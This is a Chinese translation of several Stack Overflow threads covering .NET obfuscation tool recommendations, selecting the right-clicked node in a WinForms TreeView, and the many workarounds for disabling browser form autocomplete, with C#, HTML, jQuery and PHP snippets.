* * *

## 回答 #20

> 赞同：1
> 
> 时间：2009-04-04T11:28:07.090

我们在 Windows 客户端上使用 SmartAssembly。工作得很好。

也增加了一些额外的问题。在日志文件/异常中打印出你的类名必​​须去混淆。当然不能从它的名字创建一个类。所以最好看看你的客户，看看你可以通过混淆来解决哪些问题。

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2009-07-16T21:31:20.273

这完全取决于您使用的编程语言。阅读文章：[混淆代码](http://en.wikipedia.org/wiki/Obfuscated_code)

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2009-07-16T21:38:38.480

免费的方法是在visual studio中使用dotfuscator，否则你必须出去购买像Postbuild这样的混淆器（[http://www.xenocode.com/Landing/Obfuscation.aspx](http://www.xenocode.com/Landing/Obfuscation.aspx)）

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2011-04-22T11:18:34.787

我不得不在我最新的项目中使用混淆/资源保护，并发现[Crypto Obfuscator](http://www.ssware.com/cryptoobfuscator/obfuscator-net.htm)是一个很好用且易于使用的工具。序列化问题只是此工具中的设置问题。

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2013-12-19T04:24:37.257

有一个很好的开源版本叫做 Obfuscar。似乎工作正常。可以排除类型、属性、字段、方法。原文在这里：[https://code.google.com/p/obfuscar/](https://code.google.com/p/obfuscar/)，但因为它似乎不再更新

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2009-01-03T18:56:59.397

您可能还想了解 Metaforic 和 ViLabs 等新的代码保护技术[以及](http://www.byteshield.net/)[ByteShield](http://www.vilabs.com/)等[新](http://www.metaforic.com/)的软件复制保护技术。披露：我为 ByteShield 工作。

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2009-04-04T10:53:56.470

我也使用智能组装。但是，我不知道它如何用于 Web 应用程序。但是，我想指出，如果您的应用程序使用共享软件类型保护，请确保它不检查带有布尔返回的许可证。字节破解太容易了。 [http://blogs.compdj.com/post/Binary-hack-a-NET-executable.aspx](http://blogs.compdj.com/post/Binary-hack-a-NET-executable.aspx)

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2010-12-01T04:49:21.953

SmartAssembly 很棒，我在大多数项目中都使用过

* * *

## 回答 #28

> 赞同：-1
> 
> 时间：2009-09-04T03:21:58.513

我试过 Eziriz 演示版....我喜欢它。但是从来没有带过软件。

* * *

## 回答 #29

> 赞同：-1
> 
> 时间：2014-03-06T03:03:16.467

混淆不是真正的保护。

如果你有一个 .NET Exe 文件，有一个**更好**的解决方案。

我使用**Themida** ，可以看出它运行良好。

Themida 的唯一缺点是它不能保护 .NET Dll。（它还保护 Exe 和 DLL 中的 C++ 代码）

Themida 比这里提到的混淆器便宜得多，并且是市场上最好的**反** **盗版** **保护**。它创建了一个虚拟机，运行代码的关键部分并运行多个线程来检测破解者设置的操作或断点。它将 .NET Exe 转换为 Reflector 甚至不再识别为 .NET 程序集的东西。

请阅读他们网站上的详细说明： [http ://www.oreans.com/themida_features.php](http://www.oreans.com/themida_features.php)

* * *

## 回答 #30

> 赞同：-2
> 
> 时间：2013-09-06T17:27:45.063

我试过一种叫做 Rummage 的产品，它在给你一些控制方面做得很好......虽然它缺乏 Eziriz 提供的很多东西，但 Rummage 的价格太高了......

# c# - 查找在上下文菜单下单击的节点

> ID：2527
> 
> 赞同：75
> 
> 时间：2008-08-05T16:21:14.120
> 
> 标签：c#, winforms, treeview, contextmenu

如何找出树列表中的哪个节点已激活上下文菜单？例如，右键单击一个节点并从菜单中选择一个选项。

我不能使用 TreeViews 的`SelectedNode`属性，因为该节点只是被右键单击而没有被选中。

* * *

## 回答 #1

> 赞同：96
> 
> 时间：2008-08-05T16:36:43.463

您可以将鼠标单击事件添加到 TreeView，然后在给定 MouseEventArgs 提供的鼠标坐标的情况下使用 GetNodeAt 选择正确的节点。

```
void treeView1MouseUp(object sender, MouseEventArgs e)
{
    if(e.Button == MouseButtons.Right)
    {
        // Select the clicked node
        treeView1.SelectedNode = treeView1.GetNodeAt(e.X, e.Y);

        if(treeView1.SelectedNode != null)
        {
            myContextMenuStrip.Show(treeView1, e.Location);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2010-12-08T23:05:57.037

这是我的解决方案。将此行放入 TreeView 的 NodeMouseClick 事件中：

```
 ((TreeView)sender).SelectedNode = e.Node; 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2008-12-11T21:10:43.147

我发现标准的 Windows 树视图行为选择行为非常烦人。例如，如果您使用资源管理器并右键单击一个节点并单击属性，它会突出显示该节点并显示您单击的节点的属性对话框。但是当您从对话框返回时，突出显示的节点是在您右键单击之前之前选择/突出显示的节点。我发现这会导致可用性问题，因为我一直对我是否在正确的节点上采取行动感到困惑。

因此，在我们的许多 GUI 中，我们通过右键单击更改选定的树节点，以免混淆。这可能与像 Explorer 这样的标准 iwndos 应用程序不同（出于可用性原因，我倾向于在标准窗口应用程序之后强烈建模我们的 GUI 行为），我相信这种异常情况会导致更多可用的树。

这是一些在右键单击期间更改选择的代码：

```
 private void tree_MouseUp(object sender, System.Windows.Forms.MouseEventArgs e)
  {
     // only need to change selected note during right-click - otherwise tree does
     // fine by itself
     if ( e.Button == MouseButtons.Right )
     {         
        Point pt = new Point( e.X, e.Y );
        tree.PointToClient( pt );

        TreeNode Node = tree.GetNodeAt( pt );
        if ( Node != null )
        {
           if ( Node.Bounds.Contains( pt ) )
           {
              tree.SelectedNode = Node;
              ResetContextMenu();
              contextMenuTree.Show( tree, pt );
           }
        }
     }
  } 
```

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2013-01-02T19:41:00.727

重新提出这个问题，因为我发现这是一个更好的解决方案。我改用`NodeMouseClick`事件。

```
void treeview_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
{
    if( e.Button == MouseButtons.Right )
    {
        tree.SelectedNode = e.Node;
    }
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-12-06T19:42:55.800

这是一个非常古老的问题，但我仍然觉得它很有用。我正在使用上面一些答案的组合，因为我不希望右键单击的节点成为 selectedNode。如果我选择了根节点并想删除它的一个子节点，我不希望在删除它时选择子节点（我也在 selectedNode 上做一些我不想发生在右边的工作 -点击）。这是我的贡献：

```
// Global Private Variable to hold right-clicked Node
private TreeNode _currentNode = new TreeNode();

// Set Global Variable to the Node that was right-clicked
private void treeView_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
{
    if (e.Button == System.Windows.Forms.MouseButtons.Right)
        _currentNode = e.Node;
}

// Do something when the Menu Item is clicked using the _currentNode
private void toolStripMenuItem_Clicked(object sender, EventArgs e)
{
    if (_currentNode != null)
        MessageBox.Show(_currentNode.Text);
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-11-21T22:10:51.483

与 Marcus 的回答类似，这是我发现对我有用的解决方案：

```
private void treeView_MouseClick(object sender, MouseEventArgs e)
{
    if (e.Button == MouseButtons.Right)
    {
        treeView.SelectedNode = treeView.GetNodeAt(e.Location);
    }
} 
```

如果您将其设置为每个单独的节点，则不需要自己显示上下文菜单，如下所示：

```
TreeNode node = new TreeNode();
node.ContextMenuStrip = contextMenu; 
```

然后在 ContextMenu 的 Opening 事件中，TreeView.SelectedNode 属性将反映正确的节点。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-08-08T14:04:11.503

如果您希望上下文菜单依赖于所选项目，我认为最好的办法是使用 Jonesinator 的代码来选择单击的项目。然后，您的上下文菜单内容可以依赖于所选项目。

首先选择项目而不是仅将其用于上下文菜单有一些优势。第一个是用户具有关于他点击了哪个以及菜单与哪个项目相关联的视觉指示。第二个是这样可以更容易地与其他调用上下文菜单的方法（例如键盘快捷键）保持兼容。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-05-29T22:11:10.823

这是我的做法。

```
private void treeView_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
{
    if (e.Button == System.Windows.Forms.MouseButtons.Right)
        e.Node.TreeView.SelectedNode = e.Node;
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-12-12T20:30:56.550

您可以使用的另一个选项是拥有一个具有选定节点的全局变量。您只需要使用`TreeNodeMouseClickEventArgs`.

```
public void treeNode_Click(object sender, TreeNodeMouseClickEventArgs e)
{
    _globalVariable = e.Node;
} 
```

现在您可以访问该节点及其属性。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-05-22T07:09:12.397

我想使用上下文菜单的`Opened`事件提出使用单击事件的替代方法：

```
private void Handle_ContextMenu_Opened(object sender, EventArgs e)
{
    TreeViewHitTestInfo info = treeview.HitTest(treeview.PointToClient(Cursor.Position));
    TreeNode contextNode;

    // was there a node where the context menu was opened?
    if (info != null && info.Node != null)
    {
        contextNode = info.Node;
    }

    // Set the enabled states of the context menu elements
    menuEdit.Enabled = contextNode != null;
    menuDelete.Enabled = contextNode != null;
} 
```

我可以看到这具有以下优点：

*   它不会更改所选节点
*   不需要单独的事件处理程序来存储目标节点实例
*   如果用户右键单击 TreeView 中的空白区域，可以禁用菜单项

注意：如果您担心用户在打开菜单时可能已经移动了鼠标，可以使用`Opening`事件来代替。

# html - 您如何在 Web 表单字段/输入标签上禁用浏览器自动完成功能？

> ID：2530
> 
> 赞同：3062
> 
> 时间：2008-08-05T16:22:32.603
> 
> 标签：html, forms, browser, autocomplete

您如何在主要浏览器中禁用特定输入（或表单字段）的自动完成功能？

* * *

## 回答 #1

> 赞同：2802
> 
> 时间：2008-08-05T16:24:53.380

Firefox 30 忽略`autocomplete="off"`密码，而是选择提示用户是否应将密码存储在客户端上。请注意2014 年 5 月 5 日的以下[评论：](https://bugzilla.mozilla.org/show_bug.cgi?id=956906#c100)

> *   密码管理器*总是*提示是否要保存密码。未经用户许可，不会保存密码。
> *   我们是继 IE 和 Chrome 之后第三个实现此更改的浏览器。

根据[Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion)文档，布尔表单元素属性`autocomplete`可防止表单数据在旧版浏览器中缓存。

```
<input type="text" name="foo" autocomplete="off" /> 
```

* * *

## 回答 #2

> 赞同：360
> 
> 时间：2008-10-20T13:36:30.937

除了设置之外`autocomplete=off`，您还可以通过生成页面的代码将表单字段名称随机化，可能通过在名称末尾添加一些特定于会话的字符串。

提交表单后，您可以在服务器端处理它们之前剥离该部分。这将阻止 Web 浏览器为您的字段查找上下文，也可能有助于防止 XSRF 攻击，因为攻击者无法猜测表单提交的字段名称。

* * *

## 回答 #3

> 赞同：267
> 
> 时间：2014-04-23T04:00:49.707

大多数主要浏览器和密码管理器（正确，恕我直言）现在都忽略`autocomplete=off`.

为什么？许多银行和其他“高安全性”网站`autocomplete=off`“出于安全目的”添加到他们的登录页面，但这实际上降低了安全性，因为它会导致人们更改这些高安全性网站上的密码，因为自动完成功能很容易记住（并因此破解）坏了。

很久以前，大多数密码管理器开始忽略`autocomplete=off`，现在浏览器开始只对用户名/密码输入做同样的事情。

不幸的是，自动完成实现中的错误将用户名和/或密码信息插入到不适当的表单字段中，导致表单验证错误，或者更糟糕的是，意外地将用户名插入到用户故意留空的字段中。

网络开发人员要做什么？

*   如果您可以将所有密码字段单独保留在页面上，那将是一个很好的开始，因为似乎密码字段的存在是用户/密码自动完成的主要触发因素。否则，请阅读以下提示。
*   **Safari**注意到有 2 个密码字段并在这种情况下禁用自动完成，假设它必须是更改密码表单，而不是登录表单。因此，请确保在您允许的任何表单中使用 2 个密码字段（新密码和确认新密码）
*   **不幸的是， Chrome** 34 会在看到密码字段时尝试使用用户/密码自动填充字段。这是一个非常糟糕的错误，希望他们会改变 Safari 的行为。但是，将此添加到表单顶部似乎会禁用密码自动填充：

    ```
    <input type="text" style="display:none">
    <input type="password" style="display:none"> 
    ```

我尚未彻底调查 IE 或 Firefox，但如果其他人在评论中有信息，我很乐意更新答案。

* * *

## 回答 #4

> 赞同：181
> 
> 时间：2014-06-16T16:04:00.513

有时**，即使 autocomplete=off**也**不会阻止将**凭据填写到错误的字段中，但不会阻止用户或昵称字段。

此解决方法是对[apinstein](https://stackoverflow.com/questions/2530/how-do-you-disable-browser-autocomplete-on-web-form-field-input-tags/23234498#23234498)关于浏览器行为的帖子的补充。

### 修复浏览器自动填充只读并在焦点上设置可写（单击和选项卡）

```
 <input type="password" readonly
     onfocus="this.removeAttribute('readonly');"/> 
```

更新：

Mobile Safari 在字段中设置光标，但不显示虚拟键盘。新修复程序像以前一样工作，但它处理虚拟键盘：

```
<input id="email" readonly type="email" onfocus="if (this.hasAttribute('readonly')) {
    this.removeAttribute('readonly');
    // fix for mobile safari to show virtual keyboard
    this.blur();    this.focus();  }" /> 
```

现场演示[https://jsfiddle.net/danielsuess/n0scguv6/](https://jsfiddle.net/danielsuess/n0scguv6/)

// 更新结束

**因为浏览器自动将凭据填充到错误的文本字段！？**

当有*相同形式的密码字段时，我注意到 Chrome 和 Safari 上的这种奇怪行为。*我猜浏览器会寻找一个密码字段来插入您保存的凭据。然后它自动填充（只是根据观察猜测）最近的文本输入字段，该字段出现在 DOM 中的密码字段之前。由于浏览器是最后一个实例，您无法控制它。

上面的这个只读修复对我有用。

* * *

## 回答 #5

> 赞同：163
> 
> 时间：2016-11-24T17:07:18.390

Chrome 的解决方案是`autocomplete="new-password"`在输入类型密码中添加。请检查下面的示例。

例子：

```
<form name="myForm"" method="post">
   <input name="user" type="text" />
   <input name="pass" type="password" autocomplete="new-password" />
   <input type="submit">
</form> 
```

如果 Chrome 找到一个*密码类型*的框，它总是自动完成数据，这足以指示该框`autocomplete = "new-password"`。

> 这对我很有效。

注意：确保`F12`您的更改生效。很多时候，浏览器将页面保存在缓存中，这给我一个不好的印象，它不起作用，但浏览器并没有真正带来变化。

* * *

## 回答 #6

> 赞同：111
> 
> 时间：2008-08-05T16:27:40.910

```
<form name="form1" id="form1" method="post"
      autocomplete="off" action="http://www.example.com/form.cgi"> 
```

这适用于 Internet Explorer 和 Mozilla Firefox。缺点是它不是 XHTML 标准。

* * *

## 回答 #7

> 赞同：62
> 
> 时间：2009-01-23T21:21:39.000

正如其他人所说，答案是`autocomplete="off"`。

但是，我认为值得说明**为什么**在某些情况下使用它是一个好主意，因为对此的一些答案和[重复的问题](https://stackoverflow.com/questions/471800/how-i-do-to-force-the-browser-to-not-store-the-html-form-field-data)表明最好不要关闭它。

停止浏览器存储信用卡号码不应该留给用户。太多的用户甚至不会意识到这是一个问题。

在信用卡安全码字段上将其关闭尤为重要。如[本页](http://www.mollerus.net/tom/blog/2007/05/my_best_practices_for_online_credit_card_security.html)所述：

> “永远不要存储安全码......它的价值取决于提供它的唯一方法是从实体信用卡中读取它的假设，证明提供它的人实际上持有卡。”

问题是，如果它是公共计算机（网吧、图书馆等），那么其他用户很容易窃取您的卡详细信息，甚至在您自己的计算机上，恶意网站也可能[窃取自动完成数据](http://webreflection.blogspot.com/2008/09/security-basis-and-internet-explorer.html)。

* * *

## 回答 #8

> 赞同：43
> 
> 时间：2018-08-04T14:22:21.307

我已经通过使用随机字符解决了与谷歌浏览器的无休止的斗争。当你总是用随机字符串渲染自动完成时，它永远不会记住任何东西。

```
<input name="name" type="text" autocomplete="rutjfkde"> 
```

希望它对其他人有所帮助。

* * *

## 回答 #9

> 赞同：37
> 
> 时间：2011-09-17T00:33:11.657

我不得不乞求与那些说避免禁用自动完成的答案不同。

首先要提出的是，未在登录表单字段上明确禁用自动完成是 PCI-DSS 失败。此外，如果用户的本地计算机遭到破坏，那么任何自动完成数据都可以被攻击者轻易获得，因为它是以明文形式存储的。

可用性肯定存在争议，但是在哪些表单字段应该禁用自动完成功能和哪些不应该禁用自动完成时，存在一个非常好的平衡。

* * *

## 回答 #10

> 赞同：35
> 
> 时间：2013-03-19T10:05:35.457

三个选项：

第一的：

```
<input type='text' autocomplete='off' /> 
```

第二：

```
<form action='' autocomplete='off'> 
```

第三（JavaScript代码）：

```
$('input').attr('autocomplete', 'off'); 
```

* * *

## 回答 #11

> 赞同：26
> 
> 时间：2008-09-08T19:29:03.600

在一个相关的或实际上，在完全相反的音符上——

> “如果您是上述表单的用户并且想要重新启用自动完成功能，请使用此[书签页面](https://www.squarefree.com/bookmarklets/forms.html)中的“记住密码”书签。它会删除页面`autocomplete="off"`上所有表单的所有属性。继续战斗吧！ "

* * *

## 回答 #12

> 赞同：26
> 
> 时间：2016-12-30T15:05:41.610

这对我有用。

```
<input name="pass" type="password" autocomplete="new-password" /> 
```

我们也可以在文本、选择等其他控件中使用此策略

* * *

## 回答 #13

> 赞同：26
> 
> 时间：2017-11-01T13:26:43.593

> 此外

```
autocomplete="off" 
```

> 采用

```
readonly onfocus="this.removeAttribute('readonly');" 
```

对于您不希望他们记住表单数据的输入（`username`、`password`等），如下所示：

```
<input type="text" name="UserName" autocomplete="off" readonly 
    onfocus="this.removeAttribute('readonly');" >

<input type="password" name="Password" autocomplete="off" readonly 
    onfocus="this.removeAttribute('readonly');" > 
```

希望这可以帮助。

* * *

## 回答 #14

> 赞同：24
> 
> 时间：2008-08-05T16:32:11.773

刚设置`autocomplete="off"`。这样做有一个很好的理由：您想提供自己的自动完成功能！

* * *

## 回答 #15

> 赞同：23
> 
> 时间：2013-08-15T19:02:55.470

在这次谈话中，没有一个解决方案对我有用。

我终于想出了一个不需要**任何 JavaScript的****纯 HTML 解决方案**，可以在现代浏览器中运行（Internet Explorer 除外；必须至少有一个问题，对吧？），并且不需要您禁用整个表单的自动完成功能.

 **只需关闭自动完成功能，然后为您希望它在表单中工作`form`的任何内容打开它。`input`例如：

```
<form autocomplete="off">
    <!-- These inputs will not allow autocomplete and Chrome
         won't highlight them yellow! -->
    <input name="username"  />
    <input name="password" type="password" />
    <!-- This field will allow autocomplete to work even
         though we've disabled it on the form -->
    <input name="another_field" autocomplete="on" />
</form> 
```

* * *

## 回答 #16

> 赞同：22
> 
> 时间：2008-09-16T15:35:02.770

我们确实在一个站点上使用*了 sasb*的想法。

这是一个运行医生办公室的医疗软件网络应用程序。然而，我们的许多客户都是外科医生，他们使用了许多不同的工作站，包括半公共终端。因此，他们希望确保不了解自动保存密码的含义或没有注意的医生不会意外地让他们的登录信息易于访问。

当然，这是在 Internet Explorer 8、Firefox 3.1 等开始出现隐私浏览的想法之前。即便如此，许多医生仍被迫在 IT 不会改变的医院中使用老式浏览器。

因此，我们让登录页面生成仅适用于该帖子的随机字段名称。是的，它不太方便，但它只是让用户头疼的是不在公共终端上存储登录信息。

* * *

## 回答 #17

> 赞同：22
> 
> 时间：2015-05-01T05:56:52.263

我一直在尝试无尽的解决方案，然后我发现了这个：

而不是`autocomplete="off"`简单地使用`autocomplete="false"`

就这么简单，它在谷歌浏览器中也像一个魅力！

* * *

## 回答 #18

> 赞同：20
> 
> 时间：2011-02-23T23:24:14.900

我认为`autocomplete=off`HTML 5 支持。

问问自己为什么要这样做——在某些情况下这可能是有道理的，但不要仅仅为了这样做而这样做。

这对用户来说不太方便，甚至在 OS X 中也没有安全问题（下面由 Soren 提到）。如果您担心人们的密码被远程盗取 - 即使您的应用使用`autcomplete=off`.

作为选择让浏览器记住（大部分）我的信息的用户，如果您的网站不记得我的信息，我会觉得很烦人。

* * *

## 回答 #19

> 赞同：18
> 
> 时间：2018-03-20T04:31:56.907

最佳解决方案：

防止自动完成用户名（或电子邮件）和密码：

```
<input type="email" name="email"><!-- Can be type="text" -->
<input type="password" name="password" autocomplete="new-password"> 
```

防止自动完成字段：

```
<input type="text" name="field" autocomplete="nope"> 
```

解释： `autocomplete`在 中继续工作`<input>`，`autocomplete="off"`不起作用，但您可以更改`off`为随机字符串，例如`nope`.

工作于：

*   铬：49、50、51、52、53、54、55、56、57、58、59、60、61、62、63 和 64

*   火狐：44、45、46、47、48、49、50、51、52、53、54、55、56、57和58

* * *

## 回答 #20

> 赞同：17
> 
> 时间：2016-03-22T19:38:37.547

我刚遇到这个问题并尝试了几次失败，但这一个对我有用（在[MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion)上找到）：

> 在某些情况下，即使自动完成属性设置为关闭，浏览器也会继续建议自动完成值。这种意想不到的行为可能会让开发人员感到非常困惑。真正强制不完成的技巧是为属性分配一个随机字符串，如下所示：

```
autocomplete="nope" 
```

* * *

## 回答 #21

> 赞同：16
> 
> 时间：2008-08-05T16:27:39.927

为字段使用非标准名称和 ID，因此“name”而不是“name_”。浏览器将不会将其视为名称字段。

最好的部分是您可以对某些（但不是全部）字段执行此操作，它会自动完成一些（但不是所有）字段。

* * *

## 回答 #22

> 赞同：16
> 
> 时间：2015-10-28T16:32:06.143

添加`autocomplete="off"`不会削减它。

`input`将type 属性更改为`type="search"`.
Google 不会对具有某种搜索类型的输入应用自动填充。

* * *

## 回答 #23

> 赞同：14
> 
> 时间：2011-02-11T05:14:24.133

添加

`autocomplete="off"`

`input`到表单标签将禁用该特定表单中所有字段的浏览器自动完成（之前在该字段中键入的内容） 。

测试：

*   火狐 3.5、4 测试版
*   互联网浏览器 8
*   铬合金

* * *

## 回答 #24

> 赞同：13
> 
> 时间：2010-12-12T18:34:38.757

为了避免无效的 XHTML，您可以使用 JavaScript 设置此属性。使用 jQuery 的示例：

```
<input type="text" class="noAutoComplete" ... />

$(function() {
    $('.noAutoComplete').attr('autocomplete', 'off');
}); 
```

问题是没有 JavaScript 的用户将获得自动完成功能。

* * *

## 回答 #25

> 赞同：13
> 
> 时间：2016-05-29T19:57:02.203

所以这里是：

```
function turnOnPasswordStyle() {
  $('#inputpassword').attr('type', "password");
}
```

```
<input oninput="turnOnPasswordStyle()" id="inputpassword" type="text">
```

* * *

## 回答 #26

> 赞同：12
> 
> 时间：2015-06-02T20:37:10.263

这是浏览器现在忽略的安全问题。浏览器使用输入名称来识别和存储内容，即使开发人员认为该信息是敏感信息并且不应存储。

使两个请求之间的输入名称不同将解决问题（但仍会保存在浏览器的缓存中，也会增加浏览器的缓存）。

要求用户在浏览器设置中激活或停用选项并不是一个好的解决方案。该问题可以在后端解决。

这是修复。所有自动完成元素都是使用隐藏输入生成的，如下所示：

```
<?php $r = md5(rand() . microtime(TRUE)); ?>
<form method="POST" action="./">
    <input type="text" name="<?php echo $r; ?>" />
    <input type="hidden" name="__autocomplete_fix_<?php echo $r; ?>" value="username" />
    <input type="submit" name="submit" value="submit" />
</form> 
```

然后服务器像这样处理 post 变量：( [Demo](https://3v4l.org/kBJtN) )

```
foreach ($_POST as $key => $val) {
    $newKey = preg_replace('~^__autocomplete_fix_~', '', $key, 1, $count);
    if ($count) {
        $_POST[$val] = $_POST[$newKey];
        unset($_POST[$key], $_POST[$newKey]);
    }
} 
```

可以照常访问该值

```
echo $_POST['username']; 
```

并且浏览器将无法建议来自先前请求或先前用户的信息。

即使浏览器更新他们的技术以忽略/尊重自动完成属性，这将继续有效。

* * *

## 回答 #27

> 赞同：12
> 
> 时间：2016-04-23T11:02:11.970

我不敢相信这在被报道这么久之后仍然是一个问题。以前的解决方案对我不起作用，因为[Safari](https://en.wikipedia.org/wiki/Safari_%28web_browser%29)似乎知道元素何时不显示或不在屏幕上，但是以下解决方案对我有用：

```
<div style="height:0px; overflow:hidden; ">
  Username <input type="text" name="fake_safari_username" >
  Password <input type="password" name="fake_safari_password">
</div> 
```

* * *

## 回答 #28

> 赞同：11
> 
> 时间：2012-12-04T18:24:19.860

`autocomplete="off"`如果不起作用，也试试这些：

```
autocorrect="off" autocapitalize="off" autocomplete="off" 
```

* * *

## 回答 #29

> 赞同：10
> 
> 时间：2015-07-02T10:40:19.257

此处提到的所有技巧都不适用于 Chrome。这里讨论了这个问题：[https ://code.google.com/p/chromium/issues/detail?id=468153#c41](https://code.google.com/p/chromium/issues/detail?id=468153#c41)

在作品中添加这个`<form>`（至少现在）：

```
<div style="display: none;">
    <input type="text" id="PreventChromeAutocomplete" name="PreventChromeAutocomplete" autocomplete="address-level4" />
</div> 
```

* * *

## 回答 #30

> 赞同：9
> 
> 时间：2012-11-02T17:00:44.797

您可以在`input`.

例如;

```
<input type=text name="test" autocomplete="off" /> 
```

* * *

## 回答 #31

> 赞同：8
> 
> 时间：2017-12-21T04:33:59.200

许多现代浏览器不再支持登录字段的 autocomplete="off"。 `autocomplete="new-password"`正在工作，更多信息[MDN 文档](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion)

* * *

## 回答 #32

> 赞同：7
> 
> 时间：2021-05-19T23:50:58.490

这是自 2021 年 5 月起适用于所有浏览器的完美解决方案！

# TL;博士

将您的输入字段名称和字段 ID 重命名为不相关的名称，例如`'data_input_field_1'`. 然后将`&#8204;`字符添加到标签的中间。这是一个非打印字符，因此您不会看到它，但它会诱使浏览器不将该字段识别为需要自动完成的字段，因此不会显示内置的自动完成小部件！

# 细节

几乎所有浏览器都使用字段名称、id、占位符和标签的组合来确定该字段是否属于可以从自动完成中受益的一组地址字段。因此，如果您有一个`<input type="text" id="address" name="street_address">`几乎所有浏览器都会将该字段解释为地址字段的字段。因此，浏览器将显示其内置的自动完成小部件。梦想是使用该属性`autocomplete="off"`会起作用，不幸的是，现在大多数浏览器都不服从请求。

所以我们需要使用一些技巧来让浏览器不显示内置的自动完成小部件。我们将这样做的方法是欺骗浏览器，使其相信该字段根本不是地址字段。

首先将**id**和**name**属性重命名为不会泄露您正在处理与地址相关的数据的内容。因此，与其使用`<input type="text" id="city-input" name="city">`，不如使用类似的东西`<input type="text" id="input-field-3" name="data_input_field_3">`。浏览器不知道 data_input_field_3 代表什么。但你做了。

如果可能，不要使用**占位符文本**，因为大多数浏览器也会考虑到这一点。如果您必须使用占位符文本，那么您必须发挥创意并确保您没有使用任何与地址参数本身相关的词语（例如`City`）。使用类似的东西`Enter location`可以解决问题。

最后一个参数是附加到字段的**标签。**但是，如果您像我一样，您可能希望保持标签完整，并向您的用户显示可识别的字段，例如“地址”、“城市”、“州”、“国家”。好吧，好消息：***你可以***！实现这一点的最佳方法是插入一个*零宽度非连接字符*,`&#8204;`作为标签中的第二个字符。所以替换`<label>City</label>`为`<label>C&#8204;ity</label>`. 这是一个非打印字符，因此您的用户会看到`City`，但浏览器会被欺骗`C ity`而无法识别该字段！

任务完成！如果一切顺利，浏览器不应再在这些字段上显示内置地址自动完成小部件！

* * *

## 回答 #33

> 赞同：6
> 
> 时间：2015-12-10T02:21:36.273

Chrome[计划支持这一点](https://code.google.com/p/chromium/issues/detail?id=468153#c123)。

目前最好的建议是使用很少自动完成的输入类型。

[铬讨论](https://code.google.com/p/chromium/issues/detail?id=468153#c33)

```
<input type='search' name="whatever" /> 
```

要与 Firefox 兼容，请使用普通 autocomplete='off'

```
<input type='search' name="whatever" autocomplete='off' /> 
```

* * *

## 回答 #34

> 赞同：6
> 
> 时间：2016-02-25T15:27:56.550

如果您删除`form`标签，您可以禁用自动完成功能。

我的银行也这样做了，我想知道他们是怎么做到的。它甚至会在您删除标签后删除浏览器已经记住的值。

* * *

## 回答 #35

> 赞同：6
> 
> 时间：2018-04-13T06:35:32.797

**没有虚假输入，没有javascript！**

无法跨浏览器一致地禁用自动填充。我尝试了所有不同的建议，但没有一个适用于所有浏览器。唯一的方法是根本不使用密码输入。这是我想出的：

```
<style type="text/css">
    @font-face {
        font-family: 'PasswordDots';
        src: url('text-security-disc.woff') format('woff');
        font-weight: normal;
        font-style: normal;
    }

    input.password {
        font-family: 'PasswordDots' !important;
        font-size: 8px !important;
    }
</style>

<input class="password" type="text" spellcheck="false" /> 
```

下载：[text-security-disc.woff](https://github.com/noppa/text-security/blob/master/dist/text-security-disc.woff)

这是我的最终结果：

[![密码掩码](../Images/feb0b8310e652ce1c60849a499750ed9.png)](https://i.stack.imgur.com/DQgcq.png)

负面影响是可以从输入中复制纯文本，尽管应该可以使用一些 JS 来防止这种情况。

* * *

## 回答 #36

> 赞同：5
> 
> 时间：2015-11-16T13:02:37.640

```
<script language="javascript" type="text/javascript">
    $(document).ready(function () {
        try {
            $("input[type='text']").each(
                function(){
                   $(this).attr("autocomplete", "off");
                });
        }
        catch (e) {
        }
    });
</script> 
```

* * *

## 回答 #37

> 赞同：5
> 
> 时间：2016-03-19T05:05:58.670

这就是我们所说的文本框的自动完成。

[![在此处输入图像描述](../Images/4416fd9e0a7d35dfd1dd5b57a4516dfc.png)](https://i.stack.imgur.com/6mr93.png)

我们可以通过两种方式禁用文本框的自动完成：

1.  按浏览器标签

2.  按代码

    要在浏览器中禁用，请转到设置

[![要在浏览器中禁用，请转到设置](../Images/a868f490e08a02f02c59b99be53dcaf4.png)](https://i.stack.imgur.com/3nHbK.png)

[![转到高级设置并取消选中该复选框，然后还原。](../Images/e49083a1f538ef8a8d753c9767b48140.png)](https://i.stack.imgur.com/4QqJL.png)

转到*高级设置*并取消选中该复选框，然后还原。

如果要在编码标签中禁用，可以执行以下操作 -

使用`AutoCompleteType="Disabled"`：

```
<asp:TextBox runat="server" ID="txt_userid" AutoCompleteType="Disabled"></asp:TextBox> 
```

通过设置表格`autocomplete="off"`：

```
<asp:TextBox runat="server" ID="txt_userid" autocomplete="off"></asp:TextBox> 
```

通过设置表格`autocomplete="off"`：

```
<form id="form1" runat="server" autocomplete="off">
    // Your content
</form> 
```

通过使用 .cs 页面中的代码：

```
protected void Page_Load(object sender, EventArgs e)
{
    if(!Page.IsPostBack)
    {
        txt_userid.Attributes.Add("autocomplete", "off");
    }
} 
```

**通过使用 jQuery**

```
<head runat="server">
    <title></title>

    <script src="Scripts/jquery-1.6.4.min.js"></script>

    <script type="text/javascript">
        $(document).ready(function () {
            $('#txt_userid').attr('autocomplete', 'off');
        });
    </script> 
```

* * *

## 回答 #38

> 赞同：5
> 
> 时间：2016-04-27T20:44:56.020

如果您的问题是自动完成密码字段，那么您可能会发现这很有用...

